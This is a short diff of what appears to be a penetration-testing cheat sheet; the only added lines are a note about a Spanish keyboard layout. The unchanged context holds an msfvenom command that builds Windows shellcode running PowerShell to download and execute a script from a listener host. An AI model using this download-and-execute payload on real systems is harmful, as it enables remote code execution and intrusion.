@@ -21,3 +21,5 @@
 #### Powershell
 ```msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.105:8000/PS.ps1')" lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c```
 
+#### Idioma teclado
+ES Spanish (United States)
